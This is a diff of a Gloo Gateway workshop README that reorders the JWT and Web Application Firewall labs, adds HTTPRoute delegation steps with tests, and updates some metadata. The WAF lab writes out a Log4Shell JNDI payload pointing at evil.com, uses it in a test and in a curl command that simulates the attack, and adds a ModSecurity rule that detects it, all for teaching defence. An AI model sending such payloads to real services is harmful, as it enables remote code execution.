@@ -22,8 +22,8 @@ source ./scripts/assert.sh
 * [Lab 9 - Securing the access with OAuth](#lab-9---securing-the-access-with-oauth-)
 * [Lab 10 - Use the transformation filter to manipulate headers](#lab-10---use-the-transformation-filter-to-manipulate-headers-)
 * [Lab 11 - Apply rate limiting to the Gateway](#lab-11---apply-rate-limiting-to-the-gateway-)
-* [Lab 12 - Use the Web Application Firewall filter](#lab-12---use-the-web-application-firewall-filter-)
-* [Lab 13 - Use the JWT filter to validate JWT and create headers from claims](#lab-13---use-the-jwt-filter-to-validate-jwt-and-create-headers-from-claims-)
+* [Lab 12 - Use the JWT filter to validate JWT and create headers from claims](#lab-12---use-the-jwt-filter-to-validate-jwt-and-create-headers-from-claims-)
+* [Lab 13 - Use the Web Application Firewall filter](#lab-13---use-the-web-application-firewall-filter-)
 * [Lab 14 - Deploy Argo Rollouts](#lab-14---deploy-argo-rollouts-)
 * [Lab 15 - Roll out a new app version using Argo Rollouts](#lab-15---roll-out-a-new-app-version-using-argo-rollouts-)
 * [Lab 16 - Deploy the Bookinfo sample application](#lab-16---deploy-the-bookinfo-sample-application-)
@@ -962,7 +962,7 @@ spec:
 EOF
 ```
 
-As you can see, we've added 2 new listeners. One for the httpbin.example.com hostname and one for all the other hostnames.
+As you can see, we've added 2 new listeners. One for the `httpbin.example.com` hostname and one for all the other hostnames.
 
 We used the same secret to keep things simple, but the goal is to demonstrate we can have different HTTPS listeners.
 
@@ -1128,6 +1128,7 @@ timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail 2> 
 
 
 
+
 ## Lab 6 - Delegate with control <a name="lab-6---delegate-with-control-"></a>
 
 The team in charge of the gateway can create a parent `HTTPRoute` to delegate the routing of a domain or a path prefix (for example) to an application team.
@@ -1212,6 +1213,356 @@ Here is the expected output:
   "origin": "127.0.0.6:51121",
   "url": "https://httpbin.example.com/get"
 }
+```
+
+<!--bash
+cat <<'EOF' > ./test.js
+const helpersHttp = require('./tests/chai-http');
+
+describe("httpbin through HTTPS", () => {
+  it('Checking text \'headers\'', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/get', body: 'headers', match: true }));
+})
+EOF
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/delegation/tests/https.test.js.liquid"
+tempfile=$(mktemp)
+echo "saving errors in ${tempfile}"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
+-->
+
+In the previous example, we've used a simple `/` prefix matcher for both the parent and the child `HTTPRoute`.
+
+But we'll often use the delegation capability to delegate a specific path to an application team.
+
+For example, let's say the team in charge of the gateway wants to delegate the `/status` prefix to the team in charge of the httpbin application.
+
+Let's update the parent `HTTPRoute`:
+
+```bash
+kubectl apply --context ${CLUSTER1} -f - <<EOF
+apiVersion: gateway.networking.k8s.io/v1
+kind: HTTPRoute
+metadata:
+  name: httpbin
+  namespace: gloo-system
+spec:
+  parentRefs:
+    - name: http
+      namespace: gloo-system
+      sectionName: https-httpbin
+  hostnames:
+    - "httpbin.example.com"
+  rules:
+    - matches:
+      - path:
+          type: PathPrefix
+          value: /status
+      backendRefs:
+        - name: '*'
+          namespace: httpbin
+          group: gateway.networking.k8s.io
+          kind: HTTPRoute
+EOF
+```
+
+Now, we can update the child `HTTPRoute` to match requests with the `/status/200` path:
+
+```bash
+kubectl apply --context ${CLUSTER1} -f - <<EOF
+apiVersion: gateway.networking.k8s.io/v1
+kind: HTTPRoute
+metadata:
+  name: httpbin
+  namespace: httpbin
+spec:
+  rules:
+    - matches:
+      - path:
+          type: Exact
+          value: /status/200
+      backendRefs:
+        - name: httpbin1
+          port: 8000
+EOF
+```
+
+Check you can access the `/status/200` path:
+
+```shell
+curl -k https://httpbin.example.com/status/200 -w "%{http_code}"
+```
+
+Here is the expected output:
+
+```,nocopy
+200
+```
+
+<!--bash
+cat <<'EOF' > ./test.js
+const helpersHttp = require('./tests/chai-http');
+
+describe("httpbin through HTTPS", () => {
+  it('Checking \'200\' status code', () => helpersHttp.checkURL({ host: `https://httpbin.example.com`, path: '/status/200', retCode: 200 }));
+})
+EOF
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/delegation/tests/status-200.test.js.liquid"
+tempfile=$(mktemp)
+echo "saving errors in ${tempfile}"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
+-->
+
+In the child `HTTPRoute` we've indicated the absolute path (which includes the parent path), but instead we can inherite the parent matcher and use a relative path:
+
+```bash
+kubectl apply --context ${CLUSTER1} -f - <<EOF
+apiVersion: gateway.networking.k8s.io/v1
+kind: HTTPRoute
+metadata:
+  name: httpbin
+  namespace: httpbin
+  annotations:
+    delegation.gateway.solo.io/inherit-parent-matcher: "true"
+spec:
+  rules:
+    - matches:
+      - path:
+          type: Exact
+          value: /200
+      backendRefs:
+        - name: httpbin1
+          port: 8000
+EOF
+```
+
+Check you can still access the `/status/200` path:
+
+```shell
+curl -k https://httpbin.example.com/status/200 -w "%{http_code}"
+```
+
+Here is the expected output:
+
+```,nocopy
+200
+```
+
+<!--bash
+cat <<'EOF' > ./test.js
+const helpersHttp = require('./tests/chai-http');
+
+describe("httpbin through HTTPS", () => {
+  it('Checking \'200\' status code', () => helpersHttp.checkURL({ host: `https://httpbin.example.com`, path: '/status/200', retCode: 200 }));
+})
+EOF
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/delegation/tests/status-200.test.js.liquid"
+tempfile=$(mktemp)
+echo "saving errors in ${tempfile}"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
+-->
+
+The team in charge of the `HTTPRoute` application can also take advantage of the `parentRefs` option to indicate which parent `HTTPRoute` can delegate to its own `HTTPRoute`.
+
+That's why you don't need to use `ReferenceGrant` objects when using delegation.
+
+```bash
+kubectl apply --context ${CLUSTER1} -f - <<EOF
+apiVersion: gateway.networking.k8s.io/v1
+kind: HTTPRoute
+metadata:
+  name: httpbin
+  namespace: httpbin
+  annotations:
+    delegation.gateway.solo.io/inherit-parent-matcher: "true"
+spec:
+  parentRefs:
+    - name: httpbin
+      namespace: gloo-system
+      group: gateway.networking.k8s.io
+      kind: HTTPRoute
+  rules:
+    - matches:
+      - path:
+          type: Exact
+          value: /200
+      backendRefs:
+        - name: httpbin1
+          port: 8000
+EOF
+```
+
+Check you can still access the `/status/200` path:
+
+```shell
+curl -k https://httpbin.example.com/status/200 -w "%{http_code}"
+```
+
+Here is the expected output:
+
+```,nocopy
+200
+```
+
+<!--bash
+cat <<'EOF' > ./test.js
+const helpersHttp = require('./tests/chai-http');
+
+describe("httpbin through HTTPS", () => {
+  it('Checking \'200\' status code', () => helpersHttp.checkURL({ host: `https://httpbin.example.com`, path: '/status/200', retCode: 200 }));
+})
+EOF
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/delegation/tests/status-200.test.js.liquid"
+tempfile=$(mktemp)
+echo "saving errors in ${tempfile}"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
+-->
+
+Delegation offers another very nice feature. It automatically reorders all the matchers to avoid any short-circuiting.
+
+Let's add a second child `HTTPRoute` which is matching for any request starting with the path `/status`, but sends the requests to the second httpbin service.
+
+```bash
+kubectl apply --context ${CLUSTER1} -f - <<EOF
+apiVersion: gateway.networking.k8s.io/v1
+kind: HTTPRoute
+metadata:
+  name: httpbin-status
+  namespace: httpbin
+spec:
+  rules:
+    - matches:
+      - path:
+          type: PathPrefix
+          value: /status
+      backendRefs:
+        - name: httpbin2
+          port: 8000
+EOF
+```
+
+If the matcher for `/status` is positioned before the matcher for `/status/200`, the latter would be ignored. So, all the requests would be sent to the second httpbin service.
+
+Check you can still access the `/status/200` path:
+
+```shell
+curl -k https://httpbin.example.com/status/200 -w "%{http_code}"
+```
+
+Here is the expected output:
+
+```,nocopy
+200
+```
+
+You can use the following command to validate the request has still been handled by the first httpbin application.
+
+```bash
+kubectl logs --context ${CLUSTER1} -n httpbin -l app=httpbin1 | grep curl | grep 200
+```
+
+You should get an output similar to:
+
+```log,nocopy
+time="2024-07-22T16:02:51.9508" status=200 method="GET" uri="/status/200" size_bytes=0 duration_ms=0.03 user_agent="curl/7.81.0" client_ip=10.101.0.13:58114
+```
+
+<!--bash
+cat <<'EOF' > ./test.js
+const helpersHttp = require('./tests/chai-http');
+
+describe("httpbin through HTTPS", () => {
+  it('Checking \'200\' status code', () => helpersHttp.checkURL({ host: `https://httpbin.example.com`, path: '/status/200', retCode: 200 }));
+})
+EOF
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/delegation/tests/status-200.test.js.liquid"
+tempfile=$(mktemp)
+echo "saving errors in ${tempfile}"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
+-->
+
+Check you can now also access the status `/status/201` path:
+
+```shell
+curl -k https://httpbin.example.com/status/201 -w "%{http_code}"
+```
+
+Here is the expected output:
+
+```,nocopy
+201
+```
+
+You can use the following command to validate this request has been handled by the second httpbin application.
+
+```bash
+kubectl logs --context ${CLUSTER1} -n httpbin -l app=httpbin2 | grep curl | grep 201
+```
+
+You should get an output similar to:
+
+```log,nocopy
+time="2024-07-22T16:04:53.3189" status=201 method="GET" uri="/status/201" size_bytes=0 duration_ms=0.02 user_agent="curl/7.81.0" client_ip=10.101.0.13:52424
+```
+
+<!--bash
+cat <<'EOF' > ./test.js
+const helpersHttp = require('./tests/chai-http');
+
+describe("httpbin through HTTPS", () => {
+  it('Checking \'201\' status code', () => helpersHttp.checkURL({ host: `https://httpbin.example.com`, path: '/status/201', retCode: 201 }));
+})
+EOF
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/delegation/tests/status-201.test.js.liquid"
+tempfile=$(mktemp)
+echo "saving errors in ${tempfile}"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
+-->
+
+Let's delete the latest `HTTPRoute` and apply the original ones:
+
+```bash
+kubectl delete --context ${CLUSTER1} -n httpbin httproute httpbin-status
+
+kubectl apply --context ${CLUSTER1} -f - <<EOF
+apiVersion: gateway.networking.k8s.io/v1
+kind: HTTPRoute
+metadata:
+  name: httpbin
+  namespace: gloo-system
+spec:
+  parentRefs:
+    - name: http
+      namespace: gloo-system
+      sectionName: https-httpbin
+  hostnames:
+    - "httpbin.example.com"
+  rules:
+    - matches:
+      - path:
+          type: PathPrefix
+          value: /
+      backendRefs:
+        - name: '*'
+          namespace: httpbin
+          group: gateway.networking.k8s.io
+          kind: HTTPRoute
+EOF
+
+kubectl apply --context ${CLUSTER1} -f - <<EOF
+apiVersion: gateway.networking.k8s.io/v1
+kind: HTTPRoute
+metadata:
+  name: httpbin
+  namespace: httpbin
+spec:
+  rules:
+    - matches:
+      - path:
+          type: PathPrefix
+          value: /
+      backendRefs:
+        - name: httpbin1
+          port: 8000
+EOF
 ```
 
 <!--bash
@@ -1570,7 +1921,7 @@ timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail 2> 
 
 In this step, we're going to secure the access to the `httpbin` service using OAuth.
 
-First, we need to create an `AuthConfig`, which is a CRD that contains authentication information. We've already got a secret named `oidc` that we can reference in this policy:
+First, we need to create an `AuthConfig`, which is a CRD that contains authentication information. We've already got a secret named `oauth` that we can reference in this policy:
 
 ```bash
 kubectl apply --context ${CLUSTER1} -f - <<EOF
@@ -1985,108 +2336,7 @@ kubectl delete --context ${CLUSTER1} -n httpbin routeoption routeoption
 
 
 
-## Lab 12 - Use the Web Application Firewall filter <a name="lab-12---use-the-web-application-firewall-filter-"></a>
-
-A web application firewall (WAF) protects web applications by monitoring, filtering, and blocking potentially harmful traffic and attacks that can overtake or exploit them.
-
-Gloo Gateway includes the ability to enable the ModSecurity Web Application Firewall for any incoming and outgoing HTTP connections.
-
-An example of how using Gloo Gateway we'd easily mitigate the recent Log4Shell vulnerability ([CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)), which for many enterprises was a major ordeal that took weeks and months of updating all services.
-
-The Log4Shell vulnerability impacted all Java applications that used the log4j library (common library used for logging) and that exposed an endpoint. You could exploit the vulnerability by simply making a request with a specific header. In the example below, we will show how to protect your services against the Log4Shell exploit.
-
-Using the Web Application Firewall capabilities you can reject requests containing such headers.
-
-Log4Shell attacks operate by passing in a Log4j expression that could trigger a lookup to a remote server, like a JNDI identity service. The malicious expression might look something like this: `${jndi:ldap://evil.com/x}`. It might be passed in to the service via a header, a request argument, or a request payload. What the attacker is counting on is that the vulnerable system will log that string using log4j without checking it. That's what triggers the destructive JNDI lookup and the ultimate execution of malicious code.
-
-You need to create the following `RouteOption`:
-
-```bash
-kubectl apply --context ${CLUSTER1} -f - <<EOF
-apiVersion: gateway.solo.io/v1
-kind: RouteOption
-metadata:
-  name: routeoption
-  namespace: httpbin
-spec:
-  options:
-    waf:
-      customInterventionMessage: 'Log4Shell malicious payload'
-      ruleSets:
-      - ruleStr: |
-          SecRuleEngine On
-          SecRequestBodyAccess On
-          SecRule REQUEST_LINE|ARGS|ARGS_NAMES|REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_BODY|REQUEST_HEADERS|XML:/*|XML://@*
-            "@rx \\\${jndi:(?:ldaps?|iiop|dns|rmi)://"
-            "id:1000,phase:2,deny,status:403,log,msg:'Potential Remote Command Execution: Log4j CVE-2021-44228'"
-EOF
-```
-
-Then, you need to update the `HTTPRoute` to use this `RouteOption`:
-
-```bash
-kubectl apply --context ${CLUSTER1} -f - <<EOF
-apiVersion: gateway.networking.k8s.io/v1
-kind: HTTPRoute
-metadata:
-  name: httpbin
-  namespace: httpbin
-spec:
-  rules:
-    - matches:
-      - path:
-          type: PathPrefix
-          value: /
-      filters:
-        - type: ExtensionRef
-          extensionRef:
-            group: gateway.solo.io
-            kind: RouteOption
-            name: routeoption
-      backendRefs:
-        - name: httpbin1
-          port: 8000
-EOF
-```
-
-<!--bash
-cat <<'EOF' > ./test.js
-const chaiExec = require("@jsdevtools/chai-exec");
-const helpersHttp = require('./tests/chai-http');
-var chai = require('chai');
-var expect = chai.expect;
-
-describe("WAF is working properly", function() {
-  it('The request has been blocked', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/get', headers: [{key: 'User-Agent', value: '${jndi:ldap://evil.com/x}'}], body: 'Log4Shell malicious payload' }));
-});
-EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/waf/tests/waf.test.js.liquid"
-tempfile=$(mktemp)
-echo "saving errors in ${tempfile}"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
--->
-
-Run the following command to simulate an attack:
-
-```bash
-curl -H "User-Agent: \${jndi:ldap://evil.com/x}" -k "https://httpbin.example.com/get" -i
-```
-
-The request should be rejected:
-
-```http,nocopy
-HTTP/2 403 
-content-length: 27
-content-type: text/plain
-date: Tue, 05 Apr 2022 10:20:06 GMT
-server: istio-envoy
-
-Log4Shell malicious payload
-```
-
-
-
-## Lab 13 - Use the JWT filter to validate JWT and create headers from claims <a name="lab-13---use-the-jwt-filter-to-validate-jwt-and-create-headers-from-claims-"></a>
+## Lab 12 - Use the JWT filter to validate JWT and create headers from claims <a name="lab-12---use-the-jwt-filter-to-validate-jwt-and-create-headers-from-claims-"></a>
 
 In this step, we're going to validate the JWT token and to create a new header from the `email` claim.
 
@@ -2309,6 +2559,107 @@ kubectl --context ${CLUSTER1} -n gloo-system delete virtualhostoption jwt
 kubectl --context ${CLUSTER1} -n httpbin delete routeoption jwt
 ```
 
+
+
+
+## Lab 13 - Use the Web Application Firewall filter <a name="lab-13---use-the-web-application-firewall-filter-"></a>
+
+A web application firewall (WAF) protects web applications by monitoring, filtering, and blocking potentially harmful traffic and attacks that can overtake or exploit them.
+
+Gloo Gateway includes the ability to enable the ModSecurity Web Application Firewall for any incoming and outgoing HTTP connections.
+
+An example of how using Gloo Gateway we'd easily mitigate the recent Log4Shell vulnerability ([CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)), which for many enterprises was a major ordeal that took weeks and months of updating all services.
+
+The Log4Shell vulnerability impacted all Java applications that used the log4j library (common library used for logging) and that exposed an endpoint. You could exploit the vulnerability by simply making a request with a specific header. In the example below, we will show how to protect your services against the Log4Shell exploit.
+
+Using the Web Application Firewall capabilities you can reject requests containing such headers.
+
+Log4Shell attacks operate by passing in a Log4j expression that could trigger a lookup to a remote server, like a JNDI identity service. The malicious expression might look something like this: `${jndi:ldap://evil.com/x}`. It might be passed in to the service via a header, a request argument, or a request payload. What the attacker is counting on is that the vulnerable system will log that string using log4j without checking it. That's what triggers the destructive JNDI lookup and the ultimate execution of malicious code.
+
+You need to create the following `RouteOption`:
+
+```bash
+kubectl apply --context ${CLUSTER1} -f - <<EOF
+apiVersion: gateway.solo.io/v1
+kind: RouteOption
+metadata:
+  name: routeoption
+  namespace: httpbin
+spec:
+  options:
+    waf:
+      customInterventionMessage: 'Log4Shell malicious payload'
+      ruleSets:
+      - ruleStr: |
+          SecRuleEngine On
+          SecRequestBodyAccess On
+          SecRule REQUEST_LINE|ARGS|ARGS_NAMES|REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_BODY|REQUEST_HEADERS|XML:/*|XML://@*
+            "@rx \\\${jndi:(?:ldaps?|iiop|dns|rmi)://"
+            "id:1000,phase:2,deny,status:403,log,msg:'Potential Remote Command Execution: Log4j CVE-2021-44228'"
+EOF
+```
+
+Then, you need to update the `HTTPRoute` to use this `RouteOption`:
+
+```bash
+kubectl apply --context ${CLUSTER1} -f - <<EOF
+apiVersion: gateway.networking.k8s.io/v1
+kind: HTTPRoute
+metadata:
+  name: httpbin
+  namespace: httpbin
+spec:
+  rules:
+    - matches:
+      - path:
+          type: PathPrefix
+          value: /
+      filters:
+        - type: ExtensionRef
+          extensionRef:
+            group: gateway.solo.io
+            kind: RouteOption
+            name: routeoption
+      backendRefs:
+        - name: httpbin1
+          port: 8000
+EOF
+```
+
+<!--bash
+cat <<'EOF' > ./test.js
+const chaiExec = require("@jsdevtools/chai-exec");
+const helpersHttp = require('./tests/chai-http');
+var chai = require('chai');
+var expect = chai.expect;
+
+describe("WAF is working properly", function() {
+  it('The request has been blocked', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/get', headers: [{key: 'User-Agent', value: '${jndi:ldap://evil.com/x}'}], body: 'Log4Shell malicious payload' }));
+});
+EOF
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/waf/tests/waf.test.js.liquid"
+tempfile=$(mktemp)
+echo "saving errors in ${tempfile}"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
+-->
+
+Run the following command to simulate an attack:
+
+```bash
+curl -H "User-Agent: \${jndi:ldap://evil.com/x}" -k "https://httpbin.example.com/get" -i
+```
+
+The request should be rejected:
+
+```http,nocopy
+HTTP/2 403 
+content-length: 27
+content-type: text/plain
+date: Tue, 05 Apr 2022 10:20:06 GMT
+server: istio-envoy
+
+Log4Shell malicious payload
+```
 
 
 
@@ -3845,7 +4196,7 @@ spec:
   id: bookinfo
   displayName: BookInfo REST API
   customMetadata:
-    key: value
+    imageURL: https://raw.githubusercontent.com/solo-io/workshops/master/images/bookinfo.jpg
   versions:
     - apiVersion: v1
       targetRefs:
@@ -3862,7 +4213,7 @@ EOF
 
 We define a single version `v1` and use the version custom metadata to define the lifecycle of it.
 
-As you can see, we can also define custom metadata at the Api product level.
+As you can see, we can also define custom metadata at the Api product level. We use this capability to define the picture we want to use to represent the ApiProduct in the portal.
 
 
 
@@ -4102,7 +4453,7 @@ spec:
   id: bookinfo
   displayName: BookInfo REST API
   customMetadata:
-    key: value
+    imageURL: https://raw.githubusercontent.com/solo-io/workshops/master/images/bookinfo.jpg
   versions:
     - apiVersion: v1
       targetRefs:
@@ -4340,7 +4691,7 @@ spec:
     spec:
       serviceAccountName: portal-frontend
       containers:
-      - image: gcr.io/solo-public/docs/portal-frontend:v0.0.28
+      - image: gcr.io/solo-public/docs/portal-frontend:v0.0.33
         args: ["--host", "0.0.0.0"]
         imagePullPolicy: Always
         name: portal-frontend
